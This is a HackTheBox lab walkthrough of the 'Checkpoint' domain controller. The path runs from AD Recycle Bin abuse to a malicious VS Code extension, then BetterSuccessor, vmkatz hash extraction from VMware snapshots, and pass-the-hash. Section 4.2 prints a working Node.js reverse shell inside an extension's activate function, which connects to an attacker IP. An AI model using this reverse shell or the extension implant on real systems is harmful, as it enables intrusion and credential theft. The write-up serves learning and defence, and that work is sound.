# HackTheBox: Checkpoint 

> **Date:** 2026-10-27 
> **Target:** Windows Server 2025 Domain Controller  
> **Scenario:** Assume-breach Active Directory lab

<img width="400" height="400" alt="a1e5130b-96c5-4d6b-a7c3-aaa82554d1b2-1780052391" src="https://github.com/user-attachments/assets/6ed737bb-d1a3-4356-ba00-246e1bac3875" />

---

## 1. Overview

Checkpoint is an Active Directory machine running on Windows Server 2025. The domain controller is `DC01.checkpoint.htb`, and the AD domain is `checkpoint.htb`. Unlike many HTB machines, this one begins with valid low-privileged credentials: `alex.turner` / `Checkpoint2024!`.

The intended attack path combines several less-common techniques:

- Abusing permissions over the AD Recycle Bin to bring back a deleted account.
- Using the restored account’s write access to a share to deploy a malicious VS Code extension.
- Applying the BetterSuccessor technique to recover an NTLM hash.
- Examining VMware backup snapshots with `vmkatz` to extract an administrator hash that is also valid for the domain Administrator.

---

## 2. Reconnaissance

### 2.1 Port Scanning

An `nmap` scan identifies 21 open TCP ports. These include normal Domain Controller services such as DNS on 53, Kerberos on 88, LDAP on 389 and 636, SMB on 445, WinRM on 5985, and several RPC ports. Service detection shows a Windows Server 2025 DC named `DC01` in `checkpoint.htb`.

The scan also reveals a significant clock difference of more than two days. Because Kerberos is sensitive to time skew, synchronizing time with `ntpdate` is advisable before attempting Kerberos-based authentication.

### 2.2 Initial Credentials

The supplied credentials authenticate over SMB and LDAP, but they do not work for WinRM. This confirms that `alex.turner` is a low-privileged user.

With these credentials, standard AD enumeration is performed:

- **ADCS:** Initial checks do not reveal an exploitable certificate services configuration.
- **SMB shares:** Two non-standard shares are found:
  - `DevDrop`: readable by `alex.turner`. Its description says it is a share for approved VS Code `.vsix` extension packages compatible with VS Code engine 1.118.0.
  - `VMBackups`: not readable by `alex.turner`.
  - `DevDrop` is empty at first, but its description strongly suggests that any `.vsix` file placed there will be installed or executed.
- **Kerberoasting / AS-REP Roasting:** No vulnerable accounts are identified.
- **gMSA:** No Group Managed Service Accounts are visible.

### 2.3 BloodHound and ACL Enumeration

BloodHound data is collected with `rusthound-ce`, using Kerberos authentication to work around LDAP signing requirements. The collection returns 18 users, 70 groups, and 8 OUs.

One OU named `DMSAHolder` suggests that delegated Managed Service Accounts (dMSAs) may become relevant later.

However, BloodHound does not collect ACLs on the `Deleted Objects` container or on individual deleted objects. To discover those permissions, `bloodyAD` is used to enumerate objects that `alex.turner` can write to. The results show:

- `CREATE_CHILD` on `OU=Employees`
- `WRITE` on `CN=Deleted Objects`
- `WRITE` on a deleted user named Mark Davies
- `CREATE_CHILD` on DNS zones, which is normal for authenticated users

The write permission on `CN=Deleted Objects` is especially unusual for a non-admin account.

---

## 3. Foothold: Restoring a Deleted User

### 3.1 Reanimating `mark.davies`

Restoring a deleted AD account requires three conditions:

1. Write access on the deleted object. `alex.turner` has `WRITE` on `mark.davies`.
2. Create-child permission on the destination OU. `alex.turner` has `CREATE_CHILD` on `OU=Employees`.
3. The `Reanimate-Tombstones` extended right on the domain object. ACL inspection with `bloodyAD` confirms that `alex.turner` has `CONTROL_ACCESS` with `ObjectType: Reanimate-Tombstones`.

The deleted object is located using `bloodyAD` with the `LDAP_SERVER_SHOW_RECYCLED_OID` and `LDAP_SERVER_SHOW_DEACTIVATED_LINK_OID` controls, and also with `netexec`’s tombstone module. The tombstone data shows `sAMAccountName: mark.davies` and `lastKnownParent: OU=Employees,DC=checkpoint,DC=htb`.

The account is restored with:

```
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
```

The command returns:

```
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

### 3.2 Authenticating as `mark.davies`

`alex.turner` cannot reset the password for `mark.davies`. However, the restored account still uses its original default password, `Checkpoint2024!`. This is verified with SMB authentication:

```
netexec smb 10.129.109.154 -u mark.davies -p 'Checkpoint2024!'
```

The result confirms valid credentials:

```
[+] checkpoint.htb\mark.davies:Checkpoint2024!
```

---

## 4. Shell as `ryan.brooks`: Malicious VS Code Extension

### 4.1 Enumeration as `mark.davies`

Running BloodHound again with `mark.davies` does not show interesting AD control paths. However, SMB share enumeration shows an important difference: `mark.davies` has both **READ** and **WRITE** access to `DevDrop`.

This matches the share description: it is used for approved VS Code extension packages compatible with VS Code engine 1.118.0.

### 4.2 Building the Malicious Extension

A normal VS Code extension is generated with the official scaffold:

```
npx --package yo --package generator-code -- yo code
```

The extension is named `extension` and configured as a TypeScript extension. The `activate` function in `src/extension.ts` is replaced with a Node.js reverse shell:

```
export function activate(context: vscode.ExtensionContext) {
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.15.169", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
}
```

The payload comes from revshells.com (“node.js #2”). It uses `sh` because it was unclear whether the target would execute it in a Windows shell or in WSL.

Two fields in `package.json` are changed:

- `"activationEvents": ["onStartupFinished"]` ensures the extension runs when VS Code starts.
- `"engines": { "vscode": "^1.118.0" }` matches the engine version mentioned in the share description. The generator defaults to the newest VS Code version, which would be too new for the target.

### 4.3 Delivering the Payload

The extension is packaged as a `.vsix` file and uploaded to `DevDrop` using `mark.davies`. A scheduled sync job on the target installs approved extensions from this share.

When the extension is installed and VS Code starts, the `activate` function executes and opens a reverse shell to the attacker’s listener. Since the extension runs under the user who performs the sync job, the resulting shell is as `ryan.brooks`.

---

## 5. Privilege Escalation to Domain Administrator

### 5.1 BetterSuccessor Technique

After obtaining a shell as `ryan.brooks`, the next objective is privilege escalation. The walkthrough notes that BadSuccessor is patched on this DC, but BetterSuccessor still works when the attacker has write access to the target account.

BetterSuccessor abuses delegated Managed Service Account (dMSA) functionality. By modifying specific attributes on a target account, or by creating and linking a new dMSA, an attacker can recover that account’s NTLM hash. The visible part of the source write-up does not expand every command, but the outcome is a usable NTLM hash for an account that can read the `VMBackups` share.

### 5.2 VMware Backup Analysis with `vmkatz`

The compromised account can read the `VMBackups` share, unlike `alex.turner`. This share contains VMware memory snapshots, such as `.vmsn` and `.vmss` files.

The tool `vmkatz` is used to extract credentials from these snapshots. It parses VMware memory images and recovers Windows password hashes, including NTLM hashes, from the `lsass.exe` process.

### 5.3 Administrator Hash Reuse

The hash recovered from the VMware snapshot belongs to a local administrator account. The same hash is also reused by the domain Administrator account. With that NTLM hash, the attacker can perform pass-the-hash authentication, for example with `netexec smb` or `impacket-psexec`, and gain full domain administrator access to `DC01`.

---

## 6. Attack Chain Summary

| Stage | Technique | Main Tools |
|-------|-----------|------------|
| Recon | Port scanning, SMB enumeration, BloodHound, ACL enumeration | `nmap`, `netexec`, `rusthound-ce`, `bloodyAD` |
| Foothold | Restore deleted user `mark.davies` through AD Recycle Bin abuse | `bloodyAD`, `netexec` tombstone module |
| Lateral Movement | Malicious VS Code extension uploaded to `DevDrop` | `yo code`, Node.js reverse shell |
| Privilege Escalation | BetterSuccessor → NTLM hash → `VMBackups` → `vmkatz` → Administrator hash reuse | `vmkatz`, pass-the-hash |

This machine demonstrates how several small weaknesses can be chained into full domain compromise. The key issues are excessive permissions on deleted objects, a writable extension share, and a backup share that exposes sensitive memory images. It also shows why manual ACL enumeration is important: BloodHound does not collect every permission, especially those related to deleted objects and the Recycle Bin.

---

## 7. Key Lessons

- BloodHound does not cover every ACL. Permissions on `CN=Deleted Objects` and on deleted objects need separate enumeration.
- AD Recycle Bin abuse depends on a combination of rights: write access on the deleted object, create-child on the target OU, and the `Reanimate-Tombstones` extended right.
- Restored accounts may still have their original password. Always test known or default passwords after restoring an account.
- Assume-breach scenarios require careful review of file shares. The `DevDrop` description effectively revealed the execution path.
- Malicious VS Code extensions are a practical execution method when a share is automatically synced and installed.
- VMware snapshots and other backup files are valuable targets because tools such as `vmkatz` can recover NTLM hashes from memory images.
- Hash reuse between local and domain administrators can turn a limited compromise into full domain takeover.

---

*Paraphrased from the 0xdf walkthrough of HackTheBox: Checkpoint (2026-10-24).*
